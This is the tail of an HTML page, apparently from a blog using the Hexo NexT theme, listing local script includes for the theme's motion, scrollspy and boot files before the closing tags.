  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/utils.js?v=7.1.2"></script>

  <script src="/js/motion.js?v=7.1.2"></script>



  
  


  <script src="/js/affix.js?v=7.1.2"></script>

  <script src="/js/schemes/pisces.js?v=7.1.2"></script>




  
  <script src="/js/scrollspy.js?v=7.1.2"></script>
<script src="/js/post-details.js?v=7.1.2"></script>



  


  <script src="/js/next-boot.js?v=7.1.2"></script>


  

  

  

  


  


  




  

  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
